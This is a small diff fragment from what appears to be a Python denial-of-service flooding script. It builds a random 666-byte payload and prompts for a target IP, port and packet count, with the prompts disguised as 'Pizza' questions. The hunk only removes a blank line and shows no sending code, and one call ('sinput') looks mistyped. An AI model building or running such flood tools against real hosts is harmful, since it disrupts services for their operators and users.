@@ -12,7 +12,6 @@ bytes = random._urandom(666)
 bytes  = random._urandom(666)
 
 os.system("clear")
-
 ip = sinput("[+] Pizza IP : ")
 port = input("[+] Pizza Port : ")
 sent = input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
